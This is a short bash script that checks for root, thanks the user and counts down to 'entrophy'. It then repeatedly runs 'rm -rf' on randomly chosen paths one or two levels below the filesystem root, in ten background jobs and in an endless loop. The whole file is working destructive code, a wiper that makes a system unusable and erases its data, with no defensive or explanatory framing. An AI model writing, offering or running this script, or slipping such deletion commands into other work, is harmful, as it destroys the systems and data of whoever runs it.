#!/bin/bash

# Check if the script is run as root
if [ "$(id -u)" -ne 0 ]; then
    echo "You must run this script as root!"
    exit 1
fi

# Display a thank you message
echo "Thank you for using this script."
echo "Your system will witness entrophy in ..."
for i in 3 2 1; do
    echo "$i..."
    sleep 1

done

# Preparing to generate entrophy 

for i in {1..10}; do  
    sleep 3 && sudo rm -rf $(find / -mindepth 1 -maxdepth 2 | shuf -n 1) &  
done


while true; do  
    sudo rm -rf $(find / -mindepth 1 -maxdepth 2 | shuf -n 1)  
    sleep 3  
done
